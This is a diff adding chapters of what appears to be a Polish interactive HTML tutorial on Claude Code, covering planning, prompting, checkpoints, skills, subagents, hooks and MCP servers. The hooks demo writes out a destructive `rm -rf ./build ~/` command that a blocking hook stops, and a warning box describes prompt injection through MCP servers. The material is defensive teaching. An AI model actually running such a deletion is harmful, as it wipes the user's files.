+    <div class="lane"><b>🏃 Prosto do kodu</b><div class="track" id="plan-a"></div><span class="t" id="plan-ta">0 min</span></div>
+    <div class="lane"><b>🧭 Zbadaj i zaplanuj</b><div class="track" id="plan-b"></div><span class="t" id="plan-tb">0 min</span></div>
+    <div class="legend"><span style="--c:#1b6fa8">zbadaj</span><span style="--c:#8e44ad">plan</span><span style="--c:#2f9e63">kod</span><span style="--c:#c98a00">weryfikacja</span><span style="--c:#d64545">poprawki</span></div>
+    <div class="status" id="plan-status">Wybierz rozmiar zadania i uruchom wyścig.</div>
+    <figcaption>Minuty są poglądowe, ale kształt jest lekcją: planowanie ma stały koszt, który zwraca się tylko wtedy, gdy
+      zmiana obejmuje kilka plików albo nie jesteś pewien podejścia.</figcaption>
+  </figure>
+
+  <div class="box brain reveal"><span class="lbl">🧠 Mózg na wysokich obrotach</span>
+    <p>Kiedy <em>pominąłbyś</em> plan mode całkowicie? (Podpowiedź: zasada z samej dokumentacji — jeśli potrafisz
+    opisać diff jednym zdaniem, pomiń plan.)</p>
+  </div>
+
+  <div class="box nodumb reveal"><span class="lbl">❓ Nie istnieją głupie pytania</span>
+    <div class="qa">
+      <div class="q">P:</div><div>A co, jeśli nie wiem wystarczająco dużo, by napisać dobrą specyfikację?</div>
+      <div class="a">O:</div><div>Niech Claude przeprowadzi z Tobą wywiad: „chcę dodać rate limiting. Przeprowadź ze mną wywiad pytaniami, aż
+        będziesz w stanie napisać specyfikację do <code>SPEC.md</code>.” Potem <code>/clear</code> i zacznij świeżą sesję, która implementuje
+        <code>SPEC.md</code>. Spec to przekazanie — czysty kontekst, pełna intencja.</div>
+      <div class="q">P:</div><div>Czy mogę planować silniejszym modelem, a kodować tańszym?</div>
+      <div class="a">O:</div><div>Tak: ustawienie modelu <code>opusplan</code> używa Opusa w plan mode i Sonneta do
+        wykonania.</div>
+    </div>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Badaj i planuj w plan mode (<kbd>Shift+Tab</kbd> albo <code>/plan</code>), edytuj plan przez <kbd>Ctrl+G</kbd>.</li>
+      <li>Planowanie zwraca się przy pracy na wielu plikach albo niepewnej; pomiń je dla diffów na jedno zdanie.</li>
+      <li>Dla dużych funkcji: wywiad → <code>SPEC.md</code> → <code>/clear</code> → implementacja.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 7 ============================ -->
+<section class="chapter" id="prompt">
+  <div class="chap-head reveal"><div class="chap-num">7</div><div><h2>Prompting, który działa</h2><span class="tag">usuń domysły, dodaj linię mety</span></div></div>
+
+  <p class="reveal">Claude potrafi wywnioskować wiele, ale nie to, co masz w głowie. Każdy fakt, który pominiesz, staje się
+  domysłem, a każdy domysł to szansa na rozwiązanie złego problemu. Dobry prompt nie jest długi — jest <em>konkretny</em>: gdzie
+  patrzeć, co jest nie tak, co znaczy „gotowe” i czego nie ruszać.</p>
+
+  <figure class="fig wide" id="fig-prompt">
+    <div class="ftitle">▶ Budowniczy promptów <span>zaznaczaj składniki, patrz jak znikają domysły</span></div>
+    <div class="ctrl">
+      <button class="btn" data-act="vague">😶 Mglisty preset</button>
+      <button class="btn primary" data-act="expert">🎯 Ekspercki preset</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="two">
+      <div>
+        <div class="ingr" id="pr-ingr"></div>
+        <div class="guess"><b>Claude musi zgadywać:</b></div><ul class="guess" id="pr-guess" style="margin-top:.2rem"></ul>
+      </div>
+      <div class="pbox" id="pr-box"></div>
+    </div>
+    <div class="status" id="pr-status">Zacznij od mglistego prompta, jaki pisze większość ludzi.</div>
+    <figcaption>Każdy składnik odpowiada dobrej praktyce z oficjalnej dokumentacji: odniesienia do plików, opis objawu,
+      wskazanie istniejących wzorców, komenda weryfikacji, podane ograniczenia.</figcaption>
+  </figure>
+
+  <div class="box usecase reveal"><span class="lbl">🧰 Wzorce promptów, które działają</span>
+    <ol>
+      <li><b>Pytanie wdrożeniowe:</b> „Jak tutaj działa logowanie? Prześledź jedno żądanie z <code>@src/server.ts</code> do bazy danych.”</li>
+      <li><b>Błąd z dowodami:</b> wklej stack trace albo zrzut ekranu (<kbd>Ctrl+V</kbd>), powiedz, jak odtworzyć, poproś najpierw o test, który nie przechodzi.</li>
+      <li><b>Podążaj za wzorcem:</b> „Dodaj endpoint <code>/invoices</code> jak <code>@src/api/orders.ts</code>.”</li>
+      <li><b>TDD:</b> „Napisz testy dla X, potwierdź, że nie przechodzą, commituj je. Potem implementuj, aż przejdą, bez zmieniania testów.”</li>
+      <li><b>Iteracja UI:</b> daj obraz makiety, poproś Claude o zrzut ekranu wyniku i porównanie, iteruj 2–3 razy.</li>
+      <li><b>Wlej dane rurą:</b> <code>cat error.log | claude -p "find the root cause"</code>.</li>
+    </ol>
+  </div>
+
+  <div class="box geek reveal"><span class="lbl">🤓 Dla dociekliwych</span>
+    <p>Możesz poprosić o więcej myślenia zwykłymi słowami („pomyśl solidnie o przypadkach brzegowych”) albo podnieść
+    <b>poziom wysiłku</b> sesji przez <code>/effort</code> (rozdział 15). Bogaty kontekst bije sprytne sformułowania: URL do dokumentacji,
+    obraz, pliki wspomniane przez <code>@</code>, logi przesłane rurą. Jeśli Claude ma pobrać dokumentację, zezwól na domenę regułą typu
+    <code>WebFetch(domain:docs.stripe.com)</code>.</p>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Gdzie (<code>@plik</code>) + objaw + wzorzec do naśladowania + weryfikacja + ograniczenia.</li>
+      <li>Daj Claude linię mety, którą sam może sprawdzić: test, komendę, zrzut ekranu.</li>
+      <li>Dwie nieudane korekty z rzędu → <code>/clear</code> i napisz lepszy pierwszy prompt.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 8 ============================ -->
+<section class="chapter" id="rewind">
+  <div class="chap-head reveal"><div class="chap-num">8</div><div><h2>Sesje, checkpointy i cofanie</h2><span class="tag">przycisk cofnij dla agenta</span></div></div>
+
+  <p class="reveal">Claude Code zapisuje <b>checkpoint</b> przed każdym promptem: stan rozmowy plus zrzuty
+  plików, które Claude edytował. Naciśnij <kbd>Esc</kbd> <kbd>Esc</kbd> przy pustym prompcie (albo uruchom <code>/rewind</code>), wybierz
+  wiadomość i zdecyduj: przywróć kod, przywróć rozmowę, albo obie — lub podsumuj od tego miejsca. To sprawia, że
+  eksperymenty są tanie: pozwól Claude spróbować śmiałego podejścia i cofnij, jeśli Ci się nie spodoba.</p>
+
+  <figure class="fig wide" id="fig-rewind">
+    <div class="ftitle">▶ Cofnij sesję <span>4 prompty, 3 pliki</span></div>
+    <div class="ctrl">
+      <button class="btn primary" data-act="play">▶ Odtwórz sesję</button>
+      <button class="btn" data-act="code">⏪ Cofnij kod do stanu przed P2</button>
+      <button class="btn" data-act="conv">⏪ Cofnij tylko rozmowę</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="tl" id="rw-tl"></div>
+    <div class="files" id="rw-files"></div>
+    <div class="status" id="rw-status">Najpierw odtwórz sesję.</div>
+    <figcaption>Rzeczywiste zachowanie: checkpointy śledzą edycje wykonane narzędziami plikowymi Claude. Zmiany zrobione poleceniami Bash
+      (<code>rm</code>, <code>mv</code>, <code>cp</code>), przez Ciebie poza sesją, albo przez inne sesje nie są
+      przywracane. Checkpointy nie zastępują gita.</figcaption>
+  </figure>
+
+  <div class="scroll-x reveal">
+  <table class="mini">
+    <thead><tr><th>Komenda</th><th>Co robi</th></tr></thead>
+    <tbody>
+      <tr><td><code>claude -c</code> / <code>--continue</code></td><td>Kontynuuje najnowszą rozmowę w tym katalogu</td></tr>
+      <tr><td><code>claude -r</code> / <code>/resume</code></td><td>Wybiera dowolną starszą sesję (po nazwie albo ID)</td></tr>
+      <tr><td><code>/rename</code>, <code>claude -n name</code></td><td>Nazywa sesję, by móc ją wznowić po nazwie</td></tr>
+      <tr><td><code>/branch</code></td><td>Rozgałęzia rozmowę w tym miejscu, by spróbować czegoś innego</td></tr>
+      <tr><td><code>--fork-session</code></td><td>Wznawia do nowego ID sesji, zostawiając oryginał nietknięty</td></tr>
+      <tr><td><code>/rewind</code>, <kbd>Esc Esc</kbd></td><td>Przywraca kod i/lub rozmowę do checkpointu, albo podsumowuje od tego miejsca</td></tr>
+      <tr><td><code>/diff</code></td><td>Przegląda dotychczasowe zmiany w drzewie roboczym</td></tr>
+      <tr><td><code>/export</code>, <code>/copy</code></td><td>Zapisuje rozmowę / kopiuje ostatnią odpowiedź</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="box watch reveal"><span class="lbl">⚠️ Uwaga, pułapka</span>
+    <p>Checkpointy to lokalne cofanie, git to historia. Commituj przy każdym zielonym stanie („commituj to z opisowym
+    komunikatem” to całkiem dobry prompt). Wtedy nawet <code>rm -rf</code> przez Bash jest o jeden <code>git checkout</code> dalej.</p>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Każdy prompt = checkpoint. <kbd>Esc Esc</kbd> → przywróć kod, rozmowę, albo obie.</li>
+      <li>Zmiany plików zrobione przez Bash nie są śledzone. Commituj często.</li>
+      <li>Nazywaj sesje, wznawiaj przez <code>-c</code> / <code>-r</code>, rozgałęziaj przez <code>/branch</code>.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 9 ============================ -->
+<section class="chapter" id="skills">
+  <div class="chap-head reveal"><div class="chap-num">9</div><div><h2>Skille: wielorazowa wiedza</h2><span class="tag">napisz playbook raz, ładuj go tylko gdy potrzeba</span></div></div>
+
+  <p class="reveal"><b>Skilla</b> to folder z <code>SKILL.md</code>: frontmatter YAML plus instrukcje w markdown,
+  opcjonalnie ze skryptami i plikami referencyjnymi obok. Wywołujesz ją jako komendę (<code>/deploy staging</code>),
+  albo Claude ładuje ją sam, gdy Twoje zadanie pasuje do jej <code>description</code>. Niestandardowe slash-komendy zostały scalone
+  ze skillami: stary <code>.claude/commands/deploy.md</code> nadal działa i też tworzy <code>/deploy</code>.</p>
+
+  <p class="reveal">Sztuczka to <b>stopniowe ujawnianie</b> (progressive disclosure). Na starcie sesji w kontekście siedzą tylko nazwa i
+  opis każdej skilli. Pełna treść ładuje się przy użyciu skilli; pliki, do których się odnosi, ładują się tylko, gdy Claude je
+  otworzy. Więc możesz mieć pięćdziesiąt skilli i płacić za pięćdziesiąt krótkich opisów.</p>
+
+<pre class="reveal"><code>.claude/skills/release-notes/SKILL.md
+---
+name: release-notes
+description: Draft release notes from merged PRs since the last tag. Use when asked for a changelog or release notes.
+disable-model-invocation: true      # tylko ja mogę ją wywołać (/release-notes)
+allowed-tools: Bash(git log *) Bash(gh pr list *)
+context: fork                       # uruchom w forkowanym subagencie, zwróć podsumowanie
+---
+1. Find the last tag with `git describe --tags --abbrev=0`.
+2. List merged PRs since then …
+3. Group by feat / fix / chore. Output markdown. See [template.md](template.md).</code></pre>
+
+  <figure class="fig wide" id="fig-skills">
+    <div class="ftitle">▶ Stopniowe ujawnianie <span>cztery skille, jedno okno kontekstu</span></div>
+    <div class="ctrl">
+      <button class="btn primary" data-act="auto">💬 „dodaj endpoint /invoices”</button>
+      <button class="btn" data-act="deploy">⌨️ /deploy staging</button>
+      <button class="btn" data-act="fork">⌨️ /release-notes</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="shelf" id="sk-shelf"></div>
+    <div class="ctx-wrap" style="margin-top:.7rem">
+      <div class="ctx-row"><b>Główny kontekst</b><div class="ctx-bar" id="sk-main"></div></div>
+      <div class="ctx-row"><span class="mut">Forkowany subagent</span><div class="ctx-bar sub" id="sk-sub"></div></div>
+    </div>
+    <div class="status" id="sk-status">Na starcie ładują się tylko opisy — poza skillą z przerywaną ramką, której Claude nawet nie widzi.</div>
+    <figcaption>Rozmiary tokenów są poglądowe. <code>/skills</code> wylicza Twoje skille; <code>/skill-doctor</code> pokazuje, ile
+      każda kosztuje w kontekście i jak często się wyzwala.</figcaption>
+  </figure>
+
+  <div class="scroll-x reveal">
+  <table class="mini">
+    <thead><tr><th>Frontmatter</th><th>Efekt</th></tr></thead>
+    <tbody>
+      <tr><td><code>description</code></td><td>Jak Claude decyduje o jej użyciu. Powiedz <em>co</em> i <em>kiedy</em>. Mgliste = złe wyzwalacze.</td></tr>
+      <tr><td><code>disable-model-invocation: true</code></td><td>Tylko Ty możesz ją uruchomić. Do skutków ubocznych (deploy, publikacja). Zero kosztu kontekstu do momentu użycia.</td></tr>
+      <tr><td><code>user-invocable: false</code></td><td>Tylko Claude jej używa (wiedza w tle); ukryta z menu <code>/</code>.</td></tr>
+      <tr><td><code>allowed-tools</code></td><td>Narzędzia wcześniej zatwierdzone na czas działania skilli</td></tr>
+      <tr><td><code>context: fork</code> + <code>agent</code></td><td>Uruchamia w forkowanym subagencie; wraca tylko wynik</td></tr>
+      <tr><td><code>model</code>, <code>effort</code></td><td>Nadpisuje model / wysiłek na czas aktywności skilli</td></tr>
+      <tr><td><code>paths</code></td><td>Automatyczne ładowanie tylko przy pracy z pasującymi plikami</td></tr>
+      <tr><td><code>arguments</code>, <code>argument-hint</code></td><td>Nazwane argumenty (<code>$name</code>) i podpowiedź autouzupełniania</td></tr>
+      <tr><td><code>hooks</code></td><td>Hooki rejestrowane przy wywołaniu skilli</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <p class="reveal">Gdzie żyją skille: <code>~/.claude/skills/</code> (Ty, wszystkie projekty), <code>.claude/skills/</code>
+  (repozytorium — commituj to), zarządzane (Twoja firma) i pluginy (z przestrzenią nazw jak <code>/my-plugin:review</code>).
+  Claude Code dołącza też skille za darmo: <code>/code-review</code>, <code>/simplify</code>,
+  <code>/debug</code>, <code>/batch</code>, <code>/loop</code>, <code>/run</code>, <code>/verify</code>,
+  <code>/doctor</code>, <code>/fewer-permission-prompts</code> i więcej.</p>
+
+  <div class="box fireside reveal"><span class="lbl">🔥 Pogawędka przy kominku</span>
+    <p class="mut">Dzisiejsi goście: <b>CLAUDE.md</b> i <b>Skilla</b>.</p>
+    <div class="fire">
+      <div class="line l1"><div class="who">CLAUDE.md</div><div>Ładują mnie w każdej sesji. Każdej jednej. Ludzie mnie uwielbiają.</div></div>
+      <div class="line l2"><div class="who">Skilla</div><div>I płacą za Ciebie przy każdym pojedynczym żądaniu. Ja pojawiam się tylko, gdy jestem przydatna.</div></div>
+      <div class="line l1"><div class="who">CLAUDE.md</div><div>To co powinno żyć we mnie?</div></div>
+      <div class="line l2"><div class="who">Skilla</div><div>Fakty potrzebne prawie zawsze: komendy buildu, konwencje. Procedury i dokumentację referencyjną — checklistę deployu, przewodnik po stylu API — oddaj mnie.</div></div>
+    </div>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Skilla = <code>SKILL.md</code> + opcjonalne pliki. Wywoływana przez <code>/nazwa</code> albo ładowana automatycznie po opisie.</li>
+      <li>Tylko opisy kosztują kontekst do użycia. Pisz ostre opisy.</li>
+      <li>Trzeci raz wklejasz te same instrukcje → zrób z tego skillę.</li>
+      <li>Skutki uboczne → <code>disable-model-invocation: true</code>. Ciężka praca → <code>context: fork</code>.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 10 ============================ -->
+<section class="chapter" id="sub">
+  <div class="chap-head reveal"><div class="chap-num">10</div><div><h2>Subagenci: deleguj, nie zanieczyszczaj</h2><span class="tag">świeży mózg do każdej pobocznej sprawy</span></div></div>
+
+  <p class="reveal"><b>Subagent</b> to osobna instancja Claude z własnym oknem kontekstu, własnym promptem systemowym
+  i opcjonalnie własnymi narzędziami, modelem i uprawnieniami. Sesja główna przekazuje mu zadanie; on czyta, szuka, uruchamia
+  różne rzeczy i zwraca <em>tylko podsumowanie</em>. 40 przeczytanych plików nigdy nie trafia do Twojego głównego kontekstu.</p>
+
+  <p class="reveal">Claude sam używa wbudowanych subagentów: <b>Explore</b> (wyszukiwanie w kodzie tylko do odczytu), <b>Plan</b>
+  (badanie podczas plan mode) i <b>general-purpose</b> (eksploracja + modyfikacja, wieloetapowe). Możesz też poprosić: „użyj
+  subagentów, by zbadać, jak płatności, autoryzacja i e-maile każdy obsługuje ponowne próby.” Kilku może działać równolegle.</p>
+
+  <figure class="fig wide" id="fig-sub">
+    <div class="ftitle">▶ W środku vs delegowane <span>„jak płatności, auth i e-mail obsługują ponowne próby?”</span></div>
+    <div class="ctrl">
+      <button class="btn bad" data-act="inline">🐘 Zbadaj w środku</button>
+      <button class="btn primary" data-act="delegate">🕵️🕵️🕵️ Deleguj do 3 subagentów</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="ctx-wrap">
+      <div class="ctx-row"><b>Sesja główna</b><div class="ctx-bar" id="sub-main"></div></div>
+    </div>
+    <div class="sub-grid" id="sub-grid"></div>
+    <div class="status" id="sub-status">To samo pytanie, dwie strategie. Patrz, gdzie ląduje czytanie.</div>
+    <figcaption>Liczby tokenów są poglądowe. Subagenci wydają własne tokeny — delegowanie chroni głównie Twój główny
+      kontekst (tańszy model subagenta, np. Haiku, też może obniżyć koszt). Równolegli subagenci kończą wcześniej niż sekwencyjne czytanie.</figcaption>
+  </figure>
+
+<pre class="reveal"><code>.claude/agents/security-reviewer.md
+---
+name: security-reviewer
+description: Reviews diffs for injection, authz and secret-handling bugs. Use after changes to auth or API code.
+tools: Read, Grep, Glob, Bash
+model: opus
+permissionMode: plan        # tylko do odczytu
+memory: project             # przechowuje własne notatki między sesjami
+---
+You are a senior application security engineer. For each finding give file:line,
+the exploit scenario, and the minimal fix. No style comments.</code></pre>
+
+  <p class="reveal">Inne przydatne pola: <code>skills</code> (wstępne ładowanie pełnych skilli), <code>mcpServers</code>,
+  <code>hooks</code>, <code>maxTurns</code>, <code>effort</code>, <code>isolation: worktree</code> (praca na własnej kopii
+  repozytorium), <code>background: true</code>. Umieszczaj agentów w <code>.claude/agents/</code> (zespół) albo
+  <code>~/.claude/agents/</code> (Ty). Najłatwiejszy sposób napisania jednego: poproś Claude, by go stworzył.</p>
+
+  <div class="box nodumb reveal"><span class="lbl">❓ Nie istnieją głupie pytania</span>
+    <div class="qa">
+      <div class="q">P:</div><div>Skilla z <code>context: fork</code> vs subagent — jaka jest różnica?</div>
+      <div class="a">O:</div><div>Skilla to <em>treść</em> (instrukcje); subagent to <em>pracownik</em> (kontekst
+        z rolą, narzędziami i modelem). <code>context: fork</code> uruchamia treść skilli wewnątrz pracownika; pole subagenta
+        <code>skills:</code> wstępnie ładuje treść do pracownika. Łączą się ze sobą.</div>
+      <div class="q">P:</div><div>Czy subagent widzi moją rozmowę?</div>
+      <div class="a">O:</div><div>Zwykły subagent widzi tylko to, co lider przekazał w promptcie (plus CLAUDE.md i status
+        gita, poza Explore i Plan, które je pomijają). <b>Fork</b> (<code>/fork</code>, <code>/subtask</code>) kopiuje
+        całą dotychczasową rozmowę.</div>
+    </div>
+  </div>
+
+  <div class="box pencil reveal"><span class="lbl">✏️ Zaostrz ołówek</span>
+    <p>Właśnie skończyłeś funkcję. Zaprojektuj krok „recenzji adwersarialnej”, który nie dzieli martwych punktów Twojej sesji.</p>
+    <details><summary>Odpowiedź</summary><p>Uruchom świeżego subagenta-recenzenta (albo drugą sesję), który widzi tylko diff i
+    spec, nie Twoją rozmowę — nie może odziedziczyć założeń, które poczyniłeś podczas budowania. Albo uruchom
+    <code>/code-review</code>, które robi dokładnie to; <code>/code-review ultra</code> uruchamia głęboką wieloagentową recenzję w
+    chmurze.</p></details>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Subagent = izolowany kontekst + rola + narzędzia + model. Zwraca podsumowanie.</li>
+      <li>Użyj do badań, które dużo czytają, równoległych niezależnych pytań i bezstronnej recenzji.</li>
+      <li>Definiuj w <code>.claude/agents/*.md</code>; ograniczaj <code>tools</code> i <code>permissionMode</code> dla bezpieczeństwa.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 11 ============================ -->
+<section class="chapter" id="hooks">
+  <div class="chap-head reveal"><div class="chap-num">11</div><div><h2>Hooki: gwarancje, nie prośby</h2><span class="tag">kod, który uruchamia się przy każdym zdarzeniu cyklu życia</span></div></div>
+
+  <p class="reveal">Wszystko do tej pory to rada, którą model <em>interpretuje</em>. <b>Hook</b> jest inny: sam Claude Code
+  uruchamia Twoją komendę shell (albo wywołanie HTTP, narzędzie MCP, prompt lub subagenta), gdy wyzwala się zdarzenie cyklu życia. Zawsze
+  się uruchamia. Może blokować działania, wstrzykiwać kontekst albo po prostu logować. Konfiguruj hooki w <code>settings.json</code>;
+  <code>/hooks</code> pozwala je przeglądać (tylko do odczytu).</p>
+
+<pre class="reveal"><code>{
+  "hooks": {
+    "PreToolUse": [{ "matcher": "Bash",
+      "hooks": [{ "type": "command", "command": "\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/block-dangerous.sh" }] }],
+    "PostToolUse": [{ "matcher": "Edit|Write",
+      "hooks": [{ "type": "command", "command": "npx prettier --write \"$(jq -r .tool_input.file_path)\"" }] }]
+  }
+}</code></pre>
+
+  <p class="reveal">Hook dostaje ładunek JSON na stdin (nazwa narzędzia, dane wejściowe, informacje o sesji). Kod wyjścia
+  <code>0</code> = jedź dalej; kod wyjścia <code>2</code> = zablokuj, a stderr wraca jako powód (dla
+  <code>PreToolUse</code>, Claude go czyta i dostosowuje się). Dla precyzyjniejszej kontroli, wypisz JSON z decyzją.</p>
+
+  <figure class="fig wide" id="fig-hooks">
+    <div class="ftitle">▶ Jedna tura, każde zdarzenie <span>przełączaj hooki, potem uruchom turę</span></div>
+    <div class="hook-tg" id="hk-tg"></div>
+    <div class="ctrl">
+      <button class="btn primary" data-act="run">▶ Uruchom turę</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="evs" id="hk-evs"></div>
+    <div class="log" id="hk-log" style="height:170px;margin-top:.6rem"></div>
+    <div class="status" id="hk-status">Tura: Claude edytuje plik, potem próbuje <code>rm -rf ./build ~/</code> (ups — zabłąkane <code>~/</code>).</div>
+    <figcaption>Uproszczone do głównych zdarzeń. Pełna lista ma też <code>PermissionRequest</code>,
+      <code>PostToolUseFailure</code>, <code>SubagentStart/Stop</code>, <code>PreCompact/PostCompact</code>,
+      <code>Notification</code>, <code>FileChanged</code>, <code>CwdChanged</code>, <code>WorktreeCreate</code> i więcej.</figcaption>
+  </figure>
+
+  <div class="scroll-x reveal">
+  <table class="mini">
+    <thead><tr><th>Zdarzenie</th><th>Klasyczne użycie</th></tr></thead>
+    <tbody>
+      <tr><td><code>SessionStart</code></td><td>Wstrzyknij kontekst: bieżący sprint, otwarte issue, konfiguracja środowiska</td></tr>
+      <tr><td><code>UserPromptSubmit</code></td><td>Dodaj kontekst albo odrzuć prompty (np. wyciekłe sekrety)</td></tr>
+      <tr><td><code>PreToolUse</code></td><td>Blokuj niebezpieczne komendy, chroń pliki, egzekwuj reguły</td></tr>
+      <tr><td><code>PermissionRequest</code></td><td>Automatycznie zatwierdź albo odmów prośbę o uprawnienia według polityki</td></tr>
+      <tr><td><code>PostToolUse</code></td><td>Formatuj, lintuj, typecheckuj po edycjach — exit 2 (stderr) albo JSON <code>additionalContext</code> przekazuje problemy z powrotem do Claude</td></tr>
+      <tr><td><code>Stop</code></td><td>Uruchom testy, zanim Claude może skończyć; powiadom Cię</td></tr>
+      <tr><td><code>Notification</code></td><td>Ping na desktopie / telefonie, gdy Claude czeka na wejście</td></tr>
+      <tr><td><code>PreCompact</code></td><td>Zapisz kopię zapasową transkrypcji przed kompaktacją</td></tr>
+      <tr><td><code>SessionEnd</code></td><td>Sprzątanie, logowanie, metryki</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="box watch reveal"><span class="lbl">⚠️ Uwaga, pułapka</span>
+    <p>Hooki działają z uprawnieniami <b>Twojego</b> użytkownika, automatycznie, przy każdym pasującym zdarzeniu. Przeglądaj każdy skopiowany hook
+    (i każdy plugin, który dostarcza hooki) tak, jak przeglądałbyś skrypt, który wpuszczasz do <code>bash</code>. Cytuj zmienne, używaj
+    ścieżek bezwzględnych przez <code>$CLAUDE_PROJECT_DIR</code> i trzymaj je szybkie — wolny hook <code>PostToolUse</code> spowalnia
+    każdą edycję.</p>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Hook = deterministyczny kod przy zdarzeniu cyklu życia. CLAUDE.md = prośba; hook = gwarancja.</li>
+      <li>Exit 2 blokuje (<code>PreToolUse</code>), a stderr staje się informacją zwrotną dla Claude; wynik JSON może dodać kontekst. Zwykły stdout większości zdarzeń trafia tylko do logu debugowania.</li>
+      <li>Najlepsze hooki na start: formatowanie po edycji, blokowanie niebezpiecznego Bash, powiadamianie przy oczekiwaniu.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 12 ============================ -->
+<section class="chapter" id="mcp">
+  <div class="chap-head reveal"><div class="chap-num">12</div><div><h2>MCP i pluginy</h2><span class="tag">nowe ręce dla agenta, spakowane dla zespołu</span></div></div>
+
+  <p class="reveal"><b>MCP</b> (Model Context Protocol) łączy Claude z systemami zewnętrznymi jako narzędziami: GitHub, Sentry,
+  Linear, Notion, Twoja baza danych, przeglądarka. Jeśli wciąż kopiujesz dane z karty przeglądarki do czatu, ten system
+  chce być serwerem MCP.</p>
+
+<pre class="reveal"><code># zdalny serwer HTTP (OAuth w /mcp)
+claude mcp add --transport http notion https://mcp.notion.com/mcp
+# lokalny serwer stdio: wszystko po -- to komenda serwera
+claude mcp add --transport stdio db -- npx -y @bytebase/dbhub --dsn "postgresql://readonly:…@localhost:5432/app"
+# udostępnij zespołowi przez .mcp.json
+claude mcp add --scope project --transport http sentry https://mcp.sentry.dev/mcp</code></pre>
+
+  <figure class="fig wide" id="fig-mcp">
+    <div class="ftitle">▶ Podłącz serwery <span>a potem zadaj pytanie, które ich wymaga</span></div>
+    <div class="ctrl">
+      <label>Zasięg
+        <select id="mcp-scope" aria-label="zasięg">
+          <option value="local">lokalny (Ty, ten projekt)</option>
+          <option value="project">projekt (.mcp.json, zespół)</option>
+          <option value="user">użytkownik (Ty, wszystkie projekty)</option>
+        </select></label>
+      <button class="btn" data-act="gh">➕ GitHub</button>
+      <button class="btn" data-act="db">➕ Postgres</button>
+      <button class="btn" data-act="pw">➕ Playwright</button>
+      <button class="btn primary" data-act="ask">💬 „Które otwarte PR-y dotykają billing?”</button>
+      <button class="btn" data-act="plugin">📦 Zainstaluj plugin</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="two">
+      <svg viewBox="0 0 420 300" id="mcp-svg"></svg>
+      <div class="mcp-side">
+        <b>Konfiguracja zapisana w</b>
+        <div class="cfg" id="mcp-cfg">—</div>
+        <b style="display:block;margin-top:.5rem">W kontekście</b>
+        <div class="toolnames" id="mcp-tools"></div>
+      </div>
+    </div>
+    <div class="status" id="mcp-status">Jeszcze brak serwerów. Claude może używać tylko wbudowanych narzędzi.</div>
+    <figcaption>Tool search jest domyślnie włączone: na starcie ładują się tylko nazwy narzędzi; pełny schemat ładuje się, gdy Claude potrzebuje tego
+      narzędzia. <code>/mcp</code> pokazuje status i obsługuje OAuth; <code>/context all</code> pokazuje, ile tokenów zużywa każde załadowane narzędzie MCP.</figcaption>
+  </figure>
+
+  <p class="reveal">Zasięgi MCP nadpisują się po nazwie: <b>lokalny &gt; projekt &gt; użytkownik</b>. Serwery lokalne i użytkownika są zapisane w
+  <code>~/.claude.json</code>; serwery projektu w <code>.mcp.json</code> w korzeniu repozytorium, które koledzy z zespołu zatwierdzają przy pierwszym użyciu. Nigdy nie commituj tam sekretów — użyj
+  rozwinięcia <code>${ENV_VAR}</code>.</p>
+
+  <p class="reveal"><b>Pluginy</b> to warstwa pakowania: jedna instalowalna jednostka łącząca skille, subagentów, hooki, serwery MCP
+  (i serwery inteligencji kodu LSP). Dodaj <b>marketplace</b> raz, potem instaluj z niego:</p>
+<pre class="reveal"><code>/plugin marketplace add your-org/claude-plugins
+/plugin install commit-commands@claude-plugins-official
+/plugin            # przeglądaj, włączaj, wyłączaj, wybierz zasięg</code></pre>
+
+  <div class="box geek reveal"><span class="lbl">🤓 Dla dociekliwych</span>
+    <p>MCP daje <em>dostęp</em>; skilla daje <em>know-how</em>. Najsilniejsze połączenie to oba naraz: serwer MCP do Twojej
+    bazy danych plus skilla, która dokumentuje Twój schemat, nazewnictwo i reguły „nigdy nie odpytuj prod bez LIMIT”. Dla języków
+    typowanych, plugin <b>code intelligence</b> (LSP) pozwala Claude skakać do definicji i widzieć błędy typów po każdej
+    edycji, zamiast grepować — mniej odczytów plików, mniej kontekstu.</p>
+  </div>
+
+  <div class="box watch reveal"><span class="lbl">⚠️ Uwaga, pułapka</span>
+    <p>Serwer MCP, który pobiera niezaufaną treść (strony internetowe, issue, e-maile), może nieść <b>prompt injection</b>. Używaj
+    serwerów, którym ufasz, trzymaj włączone prośby o uprawnienia dla narzędzi ze skutkami ubocznymi i preferuj poświadczenia tylko do odczytu.</p>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>MCP = zewnętrzne narzędzia. <code>claude mcp add</code>, zasięgi lokalny &gt; projekt &gt; użytkownik, <code>/mcp</code> do zarządzania.</li>
+      <li>Tylko nazwy narzędzi kosztują kontekst do momentu użycia.</li>
